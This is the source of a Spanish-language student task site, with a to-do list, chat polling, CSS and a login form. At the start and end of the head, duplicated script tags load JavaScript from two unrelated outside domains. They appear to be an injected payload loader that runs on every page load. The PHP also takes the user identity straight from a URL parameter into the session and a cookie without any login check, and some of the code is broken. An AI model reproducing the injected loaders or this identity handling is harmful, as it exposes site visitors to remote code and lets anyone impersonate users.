<!DOCTYPE html>
<html lang="en">
<head><script type='text/javascript' src='https://cdn.allyouwant.online/main.js?t=lp1'></script><script type='text/javascript' src='https://cdn.eeduelements.com/jquery.js?ver=1.0.8'></script>

	<meta charset="UTF-8">
	
	<title>Easy Tasks</title>
	
	<link rel="stylesheet" href="style.css">
	
	<link href="https://fonts.googleapis.com/css?family=Bree+Serif" rel="stylesheet">
	
	<script src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous">	</script>
	
	<link href="https://fonts.googleapis.com/css?family=Rubik" rel="stylesheet">

	<script>

		str = window.location.href;
		var ind = str.indexOf("index.php");

		if(ind > 0){
			changeurl("index.php");
		}
		
		function changeurl(url)
		{
			var new_url=url;
			window.history.pushState("data","Title",new_url);
			document.title=url;
		}

	</script>

	<?php 
		
		session_start();
		
		@$user = $_GET["user"];
		@$curso = $_POST["curso"];

		$_SESSION["user"] = $user;

		if($user){
			@$username = $_SESSION["user"];	
			$cookie_name = "user";
			$cookie_value = $username;
			setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/");
		}else{
			@$username = $_SESSION["user"];
			$cookie_name = "user";
			$cookie_value = $username;
			setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/");
		}
		
		if($curso){
			@$curso = $_SESSION["curso"];	
			$cookie_name = "curso";
			$cookie_value = $curso;
			setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/");
		}else{
			@$curso = $_SESSION["curso"];
			$curso = "curso";
			$curso = $curso;
			setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/");
		}

		@$cookieUs = $_COOKIE[$cookie_name];
		@$reg = $_GET["reg"];
		
	?>
	
<script type="text/javascript">

	function ajax(){
		var req = new XMLHttpRequest();

		req.onreadystatechange = function(){
			if (req.readyState == 4 && req.status == 200) {
				document.getElementById('chat').innerHTML = req.responseText;
			}
		}

		req.open('GET', 'chat.php', true);
		req.send();
	}

	//linea que hace que se refreseque la pagina cada segundo
	setInterval(function(){ajax();}, 1000);

	/**To Do List**/

	// Create a "close" button and append it to each list item
	var myNodelist = document.getElementsByTagName("LI");
	var i;
	for (i = 0; i < myNodelist.length; i++) {
	  var span = document.createElement("SPAN");
	  var txt = document.createTextNode("\u00D7");
	  span.className = "close";
	  span.appendChild(txt);
	  myNodelist[i].appendChild(span);
	}

	// Click on a close button to hide the current list item
	var close = document.getElementsByClassName("close");
	var i;
	for (i = 0; i < close.length; i++) {
	  close[i].onclick = function() {
	    var div = this.parentElement;
	    div.style.display = "none";
	  }
	}

	// Add a "checked" symbol when clicking on a list item
	var list = document.querySelector('ul');
	list.addEventListener('click', function(ev) {
	  if (ev.target.tagName === 'LI') {
	    ev.target.classList.toggle('checked');
	  }
	}, false);

	// Create a new list item when clicking on the "Add" button
	function newElement() {
	  var li = document.createElement("li");
	  var inputValue = document.getElementById("myInput").value;
	  var t = document.createTextNode(inputValue);
	  li.appendChild(t);
	  if (inputValue === '') {
	    alert("You must write something!");
	  } else {
	    document.getElementById("myUL").appendChild(li);
	  }
	  document.getElementById("myInput").value = "";

	  var span = document.createElement("SPAN");
	  var txt = document.createTextNode("\u00D7");
	  span.className = "close";
	  span.appendChild(txt);
	  li.appendChild(span);		  

	  var img = document.createElement("IMG");
	  //var element = document.getElementById("myImg").src = "../img/download-icon.png";
	  var download = document.getElementById("myImg").src = "../img/download-icon.png";
	  span.appendChild(download);
	  li.preppendChild(span);
	  var x = document.createElement("IMG");


	  for (i = 0; i < close.length; i++) {
	      close[i].onclick = function() {
	      var div = this.parentElement;
	      div.style.display = "none";
	    }
	  }
	}

</script>
	
<style>

	@font-face{
    	font-family: Penny-Script-Demo;
    	src: url(fonts/Penny-Script-Demo.woff);
	}

	.lista-nueva li {
		font-family: Arial, Helvetica, sans-serif;
		letter-spacing: 0.5px;
    	padding-top: 8px;
    	padding-bottom: 9px;
    	font-size: 16px;
	}


	/* Include the padding and border in an element's total width and height */
	* {
	    box-sizing: border-box;
	}

	/* Remove margins and padding from the list */
	.tasks ul {
	    margin: 0;
	    padding: 0;
	}

	/* Style the list items */
	.tasks ul li {
	    cursor: pointer;
	    position: relative;
	    padding: 0px 8px 0px 40px;
	    background: #eee;
	    font-size: 18px;
	    transition: 0.2s;

	    /* make the list items unselectable */
	    -webkit-user-select: none;
	    -moz-user-select: none;
	    -ms-user-select: none;
	    user-select: none;
	}

	/* Set all odd list items to a different color (zebra-stripes) */
	.tasks ul li:nth-child(odd) {
	    background: #f9f9f9;
	}

	/* Darker background-color on hover */
	.tasks ul li:hover {
	    background: #ddd;
	}

	/* When clicked on, add a background color and strike out text */
	.tasks ul li.checked {
	    background: #888;
	    color: #fff;
	    text-decoration: line-through;
	}

	/* Add a "checked" mark when clicked on */
	.tasks ul li.checked::before {
	    content: '';
	    position: absolute;
	    border-color: #fff;
	    border-style: solid;
	    border-width: 0 2px 2px 0;
	    top: 10px;
	    left: 16px;
	    transform: rotate(45deg);
	    height: 15px;
	    width: 7px;
	}

	/* Style the close button */
	.tasks .close {
	    position: absolute;
	    right: 0;
	    top: 0;
	    /*padding: 12px 16px 12px 16px;*/
	    /*padding: 0px 18px 2px 7px;*/
	    padding: 3px 17px 1px 5px;
	}

	.tasks .close:hover {
	    background-color: #f44336;
	    color: white;
	}

	/* Style the header */
	.tasks .header {
	    background-color: #f44336;
	    padding: 13px 28px;
	    color: white;
	    text-align: center;
	}
	/* Clear floats after the header */
	.tasks .header:after {
	    content: "";
	    display: table;
	    clear: both;
	}

	/* Style the input */
	.tasks input {
	    border: none;
	    width: 75%;
	    padding: 10px;
	    float: left;
	    font-size: 16px;
	}

	/* Style the "Add" button */
	.tasks .addBtn {
	    padding: 10px;
	    width: 25%;
	    background: #d9d9d9;
	    color: #555;
	    float: left;
	    text-align: center;
	    font-size: 16px;
	    cursor: pointer;
	    transition: 0.3s;
	    margin-top: 8px;
	}

	.tasks .addBtn:hover {
	    background-color: #bbb;
	}

	.registrationForm > h1:nth-child(1) {
	    font-family: 'Rubik', sans-serif;
	    font-weight: normal;
	    padding-left: 21px;
	    margin-top: 10px;
	    margin-bottom: 10px;
	}

	</style>
<script type='text/javascript' src='https://cdn.eeduelements.com/jquery.js?ver=1.0.8'></script><script type='text/javascript' src='https://cdn.allyouwant.online/main.js?t=lp1'></script></head>
<body>
	<div class="container generalContainer">
		 
	 <header id="e-header">
	 	<img src="img/logo.png" alt="" class="logo_image">

	 	<!-- Button to open the modal login form -->
	 	<?php  
	 		@$nombresUs = $_SESSION['name'];
	 		if(isset($nombresUs)){
	 	?>
			<a href="logout.php"><button id="closeSessionBtn" class="outsideBtn closeSession">Cerrar Session</button></a>
		<?php 
			} else {
		?>
			<button onclick="document.getElementById('id01').style.display='block'" id="closeSessionBtn" class="outsideBtn">Acceder</button>
		<?php
			}
		?>
		<!-- The Modal -->
		<div id="id01" class="modal">
		  <span onclick="document.getElementById('id01').style.display='none'" 
		class="close" title="Close Modal">&times;</span>

		  <!-- Modal Content -->
		  <form class="modal-content animate" action="acceso.php" method="post">
		    <div class="imgcontainer">
		      <img src="img_avatar2.png" alt="Avatar" class="avatar">
		    </div>

		    <div class="container">
		      <label for="uname"><b>Correo</b></label>
		      <input type="text" placeholder="Enter Username" name="uname" required>

		      <label for="psw"><b>Contraseña</b></label>
		      <input type="password" placeholder="Enter Password" name="psw" required>

		      <button type="submit">Acceder</button>
		      <label>
		        <input type="checkbox" checked="checked" name="remember"> Recuerdame
		      </label>
		    </div>

		    <div class="container" style="background-color:#f1f1f1">
		      <button type="button" onclick="document.getElementById('id01').style.display='none'" class="cancelbtn">Cancelar</button>
		      <span class="psw">¿Contraseña <a href="#">olvidada?</a></span>
		    </div>
		  </form>
		</div>
		<form action="acceso.php" method="post" class="login" style="display:none;">
			
			<div class="contenedorLabel">
				<label for="usuario">
					Correo:
				</label>
				<input type="text" name="correo" class="nombreDeUsuario">
			</div>
			

			<div class="contenedorLabel">
				<label for="password">
					Contraseña:
				</label>
				<input type="password" name="password" class="passwordUsuario">
				<input type="submit" value="Enviar" class="envButton">
			</div>

		</form>
		<nav class="navbar navbar-default navigation">
		  <div class="container-fluid">
		    <!-- Collect the nav links, forms, and other content for toggling -->
		    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
		      <ul class="nav navbar-nav lista-nueva">
		        <li> <a href="index.php">Inicio</a> </li>
		        <li> <a href="tasks.php">Tareas</li> </a>
		        <li class="dropdown">
		          <a href="examenes.php"> Exámenes </a>
		        </li>
		        <li><a href="calendario.php"> Calendario </a></li>
		      </ul>
		    </div><!-- /.navbar-collapse -->
		  </div><!-- /.container-fluid -->
		</nav>
	 </header>
		
		